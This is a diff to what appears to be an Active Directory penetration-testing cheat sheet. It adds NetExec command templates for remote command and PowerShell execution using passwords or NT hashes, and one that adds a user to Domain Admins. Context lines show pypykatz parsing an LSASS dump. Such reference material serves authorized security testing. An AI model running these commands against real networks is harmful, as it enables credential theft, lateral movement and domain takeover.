@@ -481,6 +481,27 @@ sudo ./linWinPwn.sh -t <Domain_Controller_IP> -d <AD_domain> -u <AD_user> -p <AD
 pypykatz lsa minidump lsass.DMP
 ```
 </details> 
+
+# Remoce Code Execution
+
+<details>
+  <summary> wmiexec </summary> 
+  
+  ### Executes command via the follwoing protocols: 
+  
+  #### command
+  ```bash
+  NetExec <target_IP> -u <username> -p <password> -H <hash_NT]> -x <command>
+  ```
+  #### PowerShell
+  ```bash
+  NetExec <target_IP> -u <username> -p <password> -H <hash_NT]> -X <command>
+  ```
+  #### Add a new Domain Admin
+  ```bash
+  NetExec <target_IP> -u <username> -p <password> -H <hash_NT]> -x 'net group "Domain Admins" <username> /add /domain'
+  ```
+</details> 
   
 # golden and silver tickets
 #### Get user SID value by using the Windows Terminal
